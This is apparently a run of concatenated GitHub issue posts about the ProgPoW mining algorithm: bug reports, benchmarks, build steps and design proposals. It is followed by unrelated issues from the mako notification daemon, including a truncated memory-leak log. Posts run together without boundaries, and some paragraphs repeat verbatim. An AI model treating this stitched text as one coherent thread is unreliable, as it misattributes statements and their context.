[My c-progpow based off this ProgPoW tree's README.md currently only implements (cached-)full-DAG-based computation on CPU. Not lightweight.] Unless I am missing something Keccak_f800 performs only 22 permutation rounds while instead they should be 24. Round constants indexed 22 and 23 get never applied. As it turns out, this ProgPoW tree builds the ProgPoW OpenCL kernels using ProgPoW epoch derived back from the coarse Ethash DAG epochs. As a result, kernels are only built correctly, and the ProgPoW computation is only correct, very rarely - only when the block number is at or just after an Ethash DAG epoch. So it is correct e.g. for block 30000 and 60000, but not for 10000, 29000, 31000, nor 7000000 or 10000000. (The last two of these are block numbers I've been using for benchmarks before, thinking the computation is hopefully correct. This news partially invalidates those benchmark results on AMD cards, and CUDA vs. OpenCL comparisons on NVIDIA cards.)

The host-side code for CUDA doesn't have the same problem. I didn't check all the history, but my _guess_ is that when ProgPoW periods lower than Ethash DAG's were introduced, only the CUDA code was updated to reflect that. OpenCL was either forgotten or left for later, without this having been documented.

I'll probably send a PR fixing this in a few days, but I thought I'd bring this up in here first in case there are any comments. The [ProgPoW software audit](https://github.com/ethereum-cat-herders/progpow-audit/raw/master/Least%20Authority%20-%20ProgPow%20Algorithm%20Final%20Audit%20Report.pdf) recommend to increase the `DATASET_PARENTS​` Ethash cache parameter from 256 to 512. This has direct impact on verification performance as the time for single verification doubles (while ProgPoW verification slowdown is only 30-50% over Ethash).

The `DATASET_PARENTS​` increase makes the verification "even more" memory hard and lowers the instruction per cycle ratio to 1 (the max being 4).

### ProgPoW verification, `DATASET_PARENTS = 256`, epoch 0:
```
cset shield -- perf stat -B -e cache-references,cache-misses,cycles,instructions test/ethash-bench --benchmark_filter=progpow_hash/0
cset: **> 1 tasks are not movable, impossible to move
cset: --> last message, executed args into cpuset "/user", new pid is: 10825
2019-09-10 14:19:50
Running test/ethash-bench
Run on (8 X 4400 MHz CPU s)
CPU Caches:
  L1 Data 32K (x4)
  L1 Instruction 32K (x4)
  L2 Unified 256K (x4)
  L3 Unified 8192K (x1)
------------------------------------------------------
Benchmark               Time           CPU Iterations
------------------------------------------------------
progpow_hash/0       1960 us       1960 us        347

 Performance counter stats for 'test/ethash-bench --benchmark_filter=progpow_hash/0':

        65 642 783      cache-references                                            
        39 184 374      cache-misses              #   59,693 % of all cache refs    
     5 636 657 996      cycles                                                      
     7 104 679 821      instructions              #    1,26  insn per cycle         

       1,314309256 seconds time elapsed

       1,296116000 seconds user
       0,000000000 seconds sys
```

### ProgPoW verification, `DATASET_PARENTS = 512`, epoch 0:
```
cset shield -- perf stat -B -e cache-references,cache-misses,cycles,instructions test/ethash-bench --benchmark_filter=progpow_hash/0
cset: **> 1 tasks are not movable, impossible to move
cset: --> last message, executed args into cpuset "/user", new pid is: 10697
2019-09-10 14:19:26
Running test/ethash-bench
Run on (8 X 4400 MHz CPU s)
CPU Caches:
  L1 Data 32K (x4)
  L1 Instruction 32K (x4)
  L2 Unified 256K (x4)
  L3 Unified 8192K (x1)
------------------------------------------------------
Benchmark               Time           CPU Iterations
------------------------------------------------------
progpow_hash/0       3695 us       3694 us        195

 Performance counter stats for 'test/ethash-bench --benchmark_filter=progpow_hash/0':

        87 073 601      cache-references                                            
        48 426 695      cache-misses              #   55,616 % of all cache refs    
     6 589 826 522      cycles                                                      
     6 898 095 482      instructions              #    1,05  insn per cycle         

       1,534862112 seconds time elapsed

       1,512262000 seconds user
       0,004011000 seconds sys
``` Ethash DAG sizes are multiples of 128 bytes, but not of 256. ProgPoW's `README.md` says:

```
The DAG is generated exactly as in Ethash.  All the parameters (ephoch length, DAG size, etc) are unchanged.
```

ProgPoW accesses the DAG in 256-byte chunks, which is a documented change from Ethash. However, it doesn't specify how it's handling the last element of Ethash's original DAG, which is only 128 bytes long. Is that last element perhaps/hopefully never accessed? This needs to be specified fully, and implementations checked for potential unintended behavior.

Also, ProgPoW's bundled implementation of Ethash's DAG initialization has `ETHASH_MIX_BYTES` changed from 128 to 256. Since the DAG is supposed to be unchanged from Ethash's, this change is probably unneeded (at least for the host-side DAG initialization code that's also unused in the ProgPoW tree?), but it breaks the included (and also unused?) `ethash_hash()`.

The `ETHASH_MIX_BYTES` macro is reused by the CUDA and OpenCL DAG initialization code, but I guess it's not supposed to make a difference there as well? If so, should it perhaps be reverted to 128 to emphasize that the DAG is indeed unchanged from Ethash's? Or is the change to 256 needed e.g. not to waste resources on computing the last (unused?) 128 bytes? I suggest adjusting the code or comments to address or avoid these questions right in there.

In the plain C implementation of ProgPoW I'm currently playing with, I left Ethash's DAG initialization as-is (with `ETHASH_MIX_BYTES` at 128) and it's producing the correct (matching your `test-vectors.md`) digest for block 30k. https://github.com/SChernykh/CryptonightR/issues/1#issuecomment-452775046

> In fact, a carefully designed ASIC could still outperform GPU by spending more resource/area on the bottlenecks. The memory bandwidth can be greatly improved using more smaller DRAM partitions and parallel memory controllers with address interleaving. The random math cannot utilize GPU’s float point ALUs, tensor cores and certain on chip memory, which occupies much more area than the tiny integer ALUs. An ASIC implementation could just build more simplified integer ALUs, multi-bank RFs with a very simple decoder for better TLP. It is also possible to achieve chained operations with reconfigurable ALU-array.

What's IfDefElse's take on this? I have a problem with running ProgPow on my macbook (I am doing that only for test purposes).

When I start benchmark mode, I get:

```
[~/open-source/ProgPOW/build]$ ./ethminer/ethminer -G -M 10000000 --opencl-devices 1 -v 9                                    [master]
  m  13:05:44|        |  ethminer version 0.15.0.dev0
  m  13:05:44|        |  Build: darwin / release +git. 66e6979
  ℹ  13:05:44|        |  Found suitable OpenCL device [ Intel(R) UHD Graphics 630 ] with 1610612736  bytes of GPU memory
Benchmarking on platform: CL
Preparing DAG for block #10000000
 cl  13:05:44|cl-0    |  No work. Pause for 3 s.
Warming up...
 cl  13:05:47|cl-0    |  New epoch 333 / period 200000
 cl  13:05:49|cl-0    |  Platform: Apple
 cl  13:05:49|cl-0    |  Device:   AMD Radeon Pro 560X Compute Engine  / OpenCL 1.2
  ✘  13:05:50|cl-0    |  Build info: <program source>:33:32: error: parameter may not be qualified with an address space
        __local const uint32_t c_dag[PROGPOW_CACHE_WORDS],
                               ^
<program source>:34:26: error: parameter may not be qualified with an address space
        __local uint64_t share[GROUP_SHARE],
                         ^
<program source>:203:6: warning: no previous prototype for function 'keccak_f800_round'
void keccak_f800_round(uint32_t st[25], const int r)
     ^
<program source>:250:10: warning: no previous prototype for function 'keccak_f800'
uint64_t keccak_f800(__constant hash32_t const* g_header, uint64_t seed, hash32_t digest)
         ^
<program source>:283:10: warning: no previous prototype for function 'kiss99'
uint32_t kiss99(kiss99_t *st)
         ^
<program source>:295:6: warning: no previous prototype for function 'fill_mix'
void fill_mix(uint64_t seed, uint32_t lane_id, uint32_t mix[PROGPOW_REGS])
     ^
<program source>:332:20: warning: unused variable 'nonce'
    uint64_t const nonce = start_nonce + gid;
                   ^

  ✘  13:05:50|cl-0    |  OpenCL Error: clEnqueueWriteBuffer: CL_INVALID_MEM_OBJECT (-38)
Trial 1...
0
Trial 2...
0
Trial 3...
0
Trial 4...
0
Trial 5...
0
min/mean/max: 0/0/0 H/s
inner mean: 0 H/s
```

I tried to do that on two machines with gpus like that:
```Listing OpenCL devices.
FORMAT: [platformID] [deviceID] deviceName
[0] [0] Intel(R) UHD Graphics 630
    CL_DEVICE_TYPE: GPU
    CL_DEVICE_GLOBAL_MEM_SIZE: 1610612736
    CL_DEVICE_MAX_MEM_ALLOC_SIZE: 402653184
    CL_DEVICE_MAX_WORK_GROUP_SIZE: 256
[0] [1] AMD Radeon Pro 560X Compute Engine
    CL_DEVICE_TYPE: GPU
    CL_DEVICE_GLOBAL_MEM_SIZE: 4294967296
    CL_DEVICE_MAX_MEM_ALLOC_SIZE: 1073741824
    CL_DEVICE_MAX_WORK_GROUP_SIZE: 256```
```

and that:
```
Listing OpenCL devices.
FORMAT: [platformID] [deviceID] deviceName
[0] [0] Iris Pro
	CL_DEVICE_TYPE: GPU
	CL_DEVICE_GLOBAL_MEM_SIZE: 1610612736
	CL_DEVICE_MAX_MEM_ALLOC_SIZE: 402653184
	CL_DEVICE_MAX_WORK_GROUP_SIZE: 512
```

In both cases, results are the same.

I am making the project using
```
cmake .. -DETHASHCUDA=OFF -DETHASHCL=ON
```

I've seen [related ethminer issue](https://github.com/ethereum-mining/ethminer/issues/590) but it didn't help me. ProgPoW currently uses a source register content modulo cache size as the _word_ index into cache. This requires (implicit) left shift by 2 in the GPU hardware to produce the byte offset. Such left shift might or might not have a runtime performance cost, depending on compiler and microarchitecture.

This (potential) runtime cost may be reliably avoided by applying a mask to the source register content such that the _byte_ offset is extracted right away, without needing a further shift. This will change the computed hash values, but not other properties of ProgPoW (those values are supposed to be random anyway).

Here are the changes I tested on top of my current (revised in other ways) ProgPoW tree:

```diff
+++ libprogpow/ProgPow.cpp  2019-05-06 13:56:20.039805009 +0000
@@ -113,9 +113,13 @@
   ret << "uint32_t offset, data;\n";
 
   if (kern == KERNEL_CUDA)
+  {
+      ret << "const unsigned char *c_dag_uc = (const unsigned char *)c_dag;\n";
       ret << "const uint32_t lane_id = threadIdx.x & (PROGPOW_LANES-1);\n";
+  }
   else
   {
+      ret << "__local const unsigned char *c_dag_uc = (__local const unsigned char *)c_dag;\n";
       ret << "const uint32_t lane_id = get_local_id(0) & (PROGPOW_LANES-1);\n";
       ret << "const uint32_t group_id = get_local_id(0) / PROGPOW_LANES;\n";
   }
@@ -153,8 +157,8 @@
           std::string dest = mix_dst();
           uint32_t    r = rnd();
           ret << "// cache load " << i << "\n";
-          ret << "offset = " << src << " % PROGPOW_CACHE_WORDS;\n";
-          ret << "data = c_dag[offset];\n";
+          ret << "offset = " << src << " & ((PROGPOW_CACHE_WORDS << 2) - 1);\n";
+          ret << "data = c_dag_uc[offset];\n";
           ret << merge(dest, "data", r);
       }
       if (i < PROGPOW_CNT_MATH)
```

For me, this improves the hashrate on Vega 64 from 22.56 to 22.87 (+1.4%), on GTX 1080 from 14.63 to 14.73 (+0.7%), and on GTX Titan X Maxwell from 12.38 to 12.65 (+2.2%). Yes, this is in my Maxwell-friendly tree. Speedups on the newer GPUs need to be confirmed on the original Maxwell-unfriendly ProgPoW as well, which I haven't done yet (am experimenting with more tweaks anyway), but I expect them to be similar (relative to that tree's original speeds). In the original design, each byte of input is treated with a round of the FNV hashing.
https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function

Here, input data is hash in 32-bit chunks.

This is "more correct" implementation: https://godbolt.org/z/tO3Lqt. Unless I am missing something Keccak_f800 performs only 22 permutation rounds while instead they should be 24. Round constants indexed 22 and 23 get never applied. Right now, ProgPoW's cache is the first 16 KiB of DAG. This has some drawbacks:

1. It's the same for all hashes being computed, including those concurrently computed on a GPU, which wastes GPU on-die memory on many copies of this data instead of using that memory for different data.

2. Even inside each SM's shared memory or each CU's LDS (64 KiB) we may have a few copies of this data. We're giving an ASIC flexibility to provide a 16 KiB SRAM with more read ports and/or banks (or accept more bank conflict stalls) instead of the 64+ KiB SRAM that we have in the GPU.

3. The very beginning of the DAG might be especially susceptible to TMTO attacks, even though those are probably impractical because 16 KiB SRAM is cheap enough as it is.

We might partially mitigate 3 by using a later portion of the DAG or something else, but addressing 1 and 2 is not trivial. Ideally, we'd use different cache content (such as different portions of the DAG as quickly determined by a fast hash of the block header) for each hash computation. However, our current random reads from the DAG are only of 16 KiB total per hash computed, so reading another 16 KiB of the cache from a random offset as well would cost us half of the global memory bandwidth, halving the bandwidth remaining for the tiny random DAG reads.

Maybe we should consider a ProgPoW revision/mode with much higher `PROGPOW_CNT_DAG` (number of loop iterations), so that it'd read a lot more data from the DAG per hash computed (and would have a lot lower nominal hashrate as a side-effect), and could then easily afford to also read the 16 KiB cache from a random DAG offset without much effect on memory bandwidth usage (and without much additional effect on the hashrate). This would result in slower PoW verification, but maybe even 100x slower is acceptable (so that reading the 16 KiB caches from random DAG offsets would cost only 1% of total bandwidth)? Of course, it'd also go against #36, but then at least having different hashrates from Ethash's would be justified by actual advantage rather than being arbitrary.

Or maybe we should add cache writes as well, so the caches will become at least to some extent different as ProgPoW runs. (This would also mitigate 3.) Right now, we read approx. 3x cache size's worth of data from each cache, so perhaps we can afford to write 1x cache size's worth of data as well (e.g., maybe read 2x the size and write 1x the size, keeping the total cache access count the same as we currently have)? This is probably more practical than my suggestion above since it allows preserving fast verification and even implementation of #36, but it's a lower-level change.

I'd appreciate any comments. As it turns out, this ProgPoW tree builds the ProgPoW OpenCL kernels using ProgPoW epoch derived back from the coarse Ethash DAG epochs. As a result, kernels are only built correctly, and the ProgPoW computation is only correct, very rarely - only when the block number is at or just after an Ethash DAG epoch. So it is correct e.g. for block 30000 and 60000, but not for 10000, 29000, 31000, nor 7000000 or 10000000. (The last two of these are block numbers I've been using for benchmarks before, thinking the computation is hopefully correct. This news partially invalidates those benchmark results on AMD cards, and CUDA vs. OpenCL comparisons on NVIDIA cards.)

The host-side code for CUDA doesn't have the same problem. I didn't check all the history, but my _guess_ is that when ProgPoW periods lower than Ethash DAG's were introduced, only the CUDA code was updated to reflect that. OpenCL was either forgotten or left for later, without this having been documented.

I'll probably send a PR fixing this in a few days, but I thought I'd bring this up in here first in case there are any comments. Thanks for the testcase introduced in response to #4. However, the `ethminer.exe -U -M 30000` command in `test/result.log` doesn't currently produce the debugging output also shown in there, and there doesn't appear to be any code in the repository to produce that output (or is there?) - can that please be added, perhaps as a debugging mode enabled via a command-line option (that would be included in the command given in `test/result.log`, so it'd be clear how to reproduce the result from just looking at that file)? There are https://github.com/ethereum-mining/ethminer/blob/master/docs/BUILD.md and https://github.com/AndreaLanfranchi/ethminer/blob/master/docs/BUILD.md in those related repos, but apparently no equivalent in this one. Their instructions are almost usable for this repo, but not quite. Perhaps proper build instructions should be added right in here and maintained in here?

FWIW, here's what worked for me (on Scientific Linux 6.10 with CUDA 10.0 and AMDGPU-PRO 18.50, after `scl enable devtoolset-6 bash` to gain newer gcc and using `cmake3` - I omitted these two tricks from the commands below to make them readily reusable on more common and recent distros):

```
git clone https://github.com/ifdefelse/ProgPOW
cd ProgPOW
git submodule update --init --recursive
mkdir build
cd build
cmake .. -DETHASHCUDA=ON
make -sj8
```

This produced an OpenCL+CUDA build. (Why isn't CUDA enabled by default? It is in default build of current ethminer on this same system.)

Then there was this runtime error:

```
Fatal GPU error: CUDA error in func ethash_generate_dag at line 173 calling cudaGetLastError() failed with error no kernel image is available for execution on the device
```

which I solved by adding builds for all of this machine's GPUs' compute capabilities to `libethash-cuda/CMakeLists.txt`:

```diff
diff --git a/libethash-cuda/CMakeLists.txt b/libethash-cuda/CMakeLists.txt
index 89fa461..ebd079b 100644
--- a/libethash-cuda/CMakeLists.txt
+++ b/libethash-cuda/CMakeLists.txt
@@ -31,6 +31,8 @@ else()
        set(
                CUDA_NVCC_FLAGS
                ${CUDA_NVCC_FLAGS}
+               "-gencode arch=compute_35,code=sm_35"
+               "-gencode arch=compute_52,code=sm_52"
                "-gencode arch=compute_61,code=sm_61"
                "-gencode arch=compute_75,code=sm_75"
        )
```

and re-running just the final `make` command. As I understand, someone on CUDA older than 10.0 would also need to remove or comment out the line with `sm_75` on it or the build would fail. Ideally, all of this would be auto-detected and wouldn't require manual edits, but meanwhile it'd be helpful to include this in the proposed build instructions as well.

Until such instructions are added, perhaps keep this issue open so that at least what's included in this comment is easy to find by those who need the instructions. Good Afternoon, I have the problem with build and compile.
I downloaded "cable", copied it to the folder "cmake" of the ethminer, created directory "build".
But when I tried to build and compile 

mkdir build; cd build
cmake .. -DETHASHCL=OFF -DETHASHCUDA=ON
cmake --build . --config Release

I got an error:

CMake error at cmake/cable/CableBuildInfo.cmake:18 (message)
       The PROJECT_NAME argument missing.

Please, explain me, where I need to write the PROJECT_NAME Argument and please, write clear instructions for build and compile. I had to guess that I need to download "cable". ***Experimental***

This is my rebase work on top of the latest ethminer master branch.
The master branch of the ethminer a bit faster and the latest [ethash](https://github.com/chfast/ethash) already support ProgPoW v0.9.1

Please see
https://github.com/EthersocialNetwork/ethminer-ProgPOW/commits/progpow-master-rebase

***Only CUDA tested.***

## Screen shot
(rebased ProgPoW ethminer + chfast/ethash master branch with a small progpow CPU verifier wrapper fix)
![image](https://user-images.githubusercontent.com/32324335/48892861-58eebc00-ee82-11e8-96f6-8c357505fc19.png)

![image](https://user-images.githubusercontent.com/32324335/48893038-baaf2600-ee82-11e8-8f61-dfca3c6a75d8.png)
P106-6G (samsung) ~10.4MH/s (~24.0MH/s for ethash) It should be possible to sanity-check the performance of a ProgPOW build against its developers' expectations. For that, this repository should include benchmark results on a few system setups (which should also be documented - both hardware and software) for the latest and/or other specified versions of ProgPOW. So far, I only found outdated results in the "Testing" section of the first comment in https://github.com/ZcashFoundation/GrantProposals-2018Q2/issues/15, and these don't include detail on the system setups (they only list GPU types) nor the block number. In #26, I obtained/confirmed some benchmark results for ProgPoW 0.9.2, including e.g. 22.7M at block 7M on Vega 64 actually running at 1401 MHz when running that benchmark.

Simulating this version with c-progpow, I get 36864 Merge and 20480 Math operations per hash computed. This gives `22.7M*(20480+36864) = ~1302M` of those operations per second on Vega 64. While this is a sane number considering that many of those operations correspond to multiple instructions, let's recall that a Vega 64 at 1401 MHz is capable of computing `4096*1401 = ~5738M` operations per cycle (or virtually ~11477M FP32 FLOPS due to how those are traditionally counted with MUL and ADD halves of a MAD as separate FLOPS).

Besides register file and local memory lookups, MULs or MADs are pretty much the only other operations we have on GPUs that consume relatively non-trivial resources in custom hardware. As once again confirmed in a recent comment in #24, all other operations of ProgPoW add relatively little.

I think ProgPoW would be greatly improved by cutting down on its limited programmability and instead making greater use of MADs. Even if we count a MAD as just one operation (unlike it's historically done for FLOPS), we have up to a 4.4x potential improvement here (as ~1302M to ~5738M).

Further, Math only performs MULs 2/11 of the time, and Merge only performs specialized multiplication by 33 (equivalent to shifting the number left by 5 bits and adding that to itself). With this, ProgPoW currently performs only `22.7M*20480*2/11 = ~84.5M` arbitrary MULs per second. The potential improvement in terms of arbitrary MUL/s is thus up to 68x (~84.5M to ~5738M).

This is much more important than the limited programmability that ProgPoW now has. That said, some programmability can be retained (thus justifying the name) - it will remain in routing of different registers as inputs and outputs of each MAD. Such routing, and not the choice of instruction (which is just a MUX or such), is the relatively heavier component.

I recognize that we might not be able to run a lengthy stream consisting exclusively of MADs without many intermediate values degrading to zeroes, etc. too often (although frequent register file and local memory lookups should help here - we have lots of internal state, so it won't degrade fully too quickly). So the actual improvement we can achieve will be somewhat less than those theoretical maximums I listed. But we can probably get close to them, certainly much closer than we're now.

We might also want to revisit use of FP32 MADs in addition to integer ones. (IEEE might provide us sufficient guarantees.) This should double the throughput on NVIDIA Turing and Volta, but then we'd need to decide whether we'd make use of that throughput (maybe not fully?) not to slow down other GPUs too much. On NVIDIA's diagrams, the FP32 units are shown as occupying 2x the area of the INT32 ones; if that corresponds to actual die area, that's yet another reason to use them. There has a NSIGHT profiling result on the web:
https://medium.com/@ifdefelse/understanding-progpow-performance-and-tuning-d72713898db3

I have also tried to do profiling on 1080 Ti with the same codebsae from this github, and have some questions to ask.

The result shows that the ‘Issued Warp Per scheduler’ is only 0.77, which implies that the poor latency hiding, it might be too low compared to 0.94 on 1060, 0.88 on 1070.

Also, the result of ‘Warp State Statistics’ shows that, the bottleneck is ‘Stall Short Scoreboard’ which is related to operations to shared memory.

Below are my shared memory profiling:

Instructions, Requests, %Peak, Bank Conflicts

201326592, 706282140, 76.35, 504955548

Compared with 1060 and 1070, they are the same instructions, but more requests and bank conflicts, I guess it might be the reason of high latency on my experiment.

But, I don’t know why the requests and bank conflicts are about 257274 more than 1060/1070, could anyone help with that? We might want to either tune ProgPoW to produce a similar hashrate to what Ethash produces on same currently relevant hardware and at same DAG size, or document a rationale why we don't.

Right now, ProgPoW produces hashrate that is _numerically_ significantly below Ethash's. This may require hard-coding a difficulty scaling factor to apply on a switchover from Ethash to ProgPoW, and it has a psychological effect of making ProgPoW appear "worse".

Why don't we reduce `PROGPOW_CNT_DAG` to a level where the hashrates are similar, effectively hard-coding this scaling factor into ProgPoW itself? I understand they can't be exactly the same since the current hashrate ratio between the two hashes varies across different GPUs, but at least we can reduce the difference between ProgPoW's and Ethash's numeric hashrate and eliminate the need for an external scaling factor.

To support the trick I described in https://github.com/ifdefelse/ProgPOW/issues/26#issuecomment-480382319 we might have some constraints on optimal values for `PROGPOW_CNT_DAG` - e.g., it'd need to be a multiple of 4 in order to avoid fetching a smaller last group of blocks in the example in that comment - but this still leaves us with a lot of freedom for adjusting the value.
<---------->
130588871
I use

```
notify-send -t 5000 --icon=/usr/share/icons/gnome/32x32/actions/mail-message-new.png ...
```

but mako doesn't display the icon:

```
Failed to load icon (Failed to open file “/usr/share/icons/gnome/32x32/actions/mail-message-new.png”: Permission denied)
```

dmesg contains:

```
audit: type=1400 audit(1576251187.001:673): apparmor="DENIED" operation="open" profile="fr.emersion.Mako" name="/usr/share/icons/gnome/32x32/actions/mail-message-new.png" pid=9537 comm="mako" requested_mask="r" denied_mask="r" fsuid=1000 ouid=0
```

```
15:24 < emersion> this needs to be fixed here: https://github.com/emersion/mako/blob/master/contrib/apparmor/fr.emersion.Mako
15:24 < emersion> patches welcome
15:26 < emersion> tbm: including <abstractions/freedesktop.org> might be enough
15:26 < emersion> https://raw.githubusercontent.com/mk-fg/apparmor-profiles/master/profiles/abstractions/freedesktop.org
```

I'll try that later. It would be useful for the CLI to have an option to set the path to the configuration. ```
=================================================================
==643==ERROR: LeakSanitizer: detected memory leaks

Direct leak of 281856 byte(s) in 509 object(s) allocated from:
    #0 0x7f51312a9f30 in __interceptor_realloc /build/gcc/src/gcc/libsanitizer/asan/asan_malloc_linux.cc:163
    #1 0x7f512fe36661  (/usr/lib/libfontconfig.so.1+0x21661)

Direct leak of 12533 byte(s) in 199 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591460 in create_criteria_from_notification ../criteria.c:370
    #2 0x55876c579ebf in handle_notify ../dbus/xdg.c:370
    #3 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 9886 byte(s) in 158 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591460 in create_criteria_from_notification ../criteria.c:370
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57cf54 in close_all_notifications ../notification.c:127
    #4 0x55876c574807 in handle_dismiss_all_notifications ../dbus/mako.c:21
    #5 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 6920 byte(s) in 199 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590ce2 in create_criteria_from_notification ../criteria.c:363
    #2 0x55876c579ebf in handle_notify ../dbus/xdg.c:370
    #3 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 5657 byte(s) in 158 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590ce2 in create_criteria_from_notification ../criteria.c:363
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57cf54 in close_all_notifications ../notification.c:127
    #4 0x55876c574807 in handle_dismiss_all_notifications ../dbus/mako.c:21
    #5 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 2822 byte(s) in 199 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59134a in create_criteria_from_notification ../criteria.c:369
    #2 0x55876c579ebf in handle_notify ../dbus/xdg.c:370
    #3 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 2183 byte(s) in 158 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59134a in create_criteria_from_notification ../criteria.c:369
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57cf54 in close_all_notifications ../notification.c:127
    #4 0x55876c574807 in handle_dismiss_all_notifications ../dbus/mako.c:21
    #5 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 1716 byte(s) in 28 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591460 in create_criteria_from_notification ../criteria.c:370
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57e824 in notification_execute_binding ../notification.c:291
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 1592 byte(s) in 199 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590bcc in create_criteria_from_notification ../criteria.c:362
    #2 0x55876c579ebf in handle_notify ../dbus/xdg.c:370
    #3 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 1264 byte(s) in 158 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590bcc in create_criteria_from_notification ../criteria.c:362
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57cf54 in close_all_notifications ../notification.c:127
    #4 0x55876c574807 in handle_dismiss_all_notifications ../dbus/mako.c:21
    #5 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 1062 byte(s) in 28 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590ce2 in create_criteria_from_notification ../criteria.c:363
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57e824 in notification_execute_binding ../notification.c:291
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 591 byte(s) in 199 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591234 in create_criteria_from_notification ../criteria.c:368
    #2 0x55876c579ebf in handle_notify ../dbus/xdg.c:370
    #3 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 572 byte(s) in 8 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591460 in create_criteria_from_notification ../criteria.c:370
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57eb30 in notification_execute_binding ../notification.c:304
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 445 byte(s) in 158 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591234 in create_criteria_from_notification ../criteria.c:368
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57cf54 in close_all_notifications ../notification.c:127
    #4 0x55876c574807 in handle_dismiss_all_notifications ../dbus/mako.c:21
    #5 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 359 byte(s) in 5 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c591460 in create_criteria_from_notification ../criteria.c:370
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c574964 in handle_dismiss_last_notification ../dbus/mako.c:37
    #4 0x7f5130e935d8  (/usr/lib/libsystemd.so.0+0x6c5d8)

Direct leak of 347 byte(s) in 28 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c59134a in create_criteria_from_notification ../criteria.c:369
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57e824 in notification_execute_binding ../notification.c:291
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 224 byte(s) in 28 object(s) allocated from:
    #0 0x7f51312308d6 in __interceptor_strdup /build/gcc/src/gcc/libsanitizer/asan/asan_interceptors.cc:445
    #1 0x55876c590bcc in create_criteria_from_notification ../criteria.c:362
    #2 0x55876c57cacb in close_notification ../notification.c:102
    #3 0x55876c57e824 in notification_execute_binding ../notification.c:291
    #4 0x55876c57ebe7 in notification_handle_button ../notification.c:315
    #5 0x55876c5876f8 in pointer_handle_button ../wayland.c:147
    #6 0x7f512f7996cf in ffi_call_unix64 (/usr/lib/libffi.so.6+0x66cf)

Direct leak of 202 byte(s) in 8 object(s) allocated from:
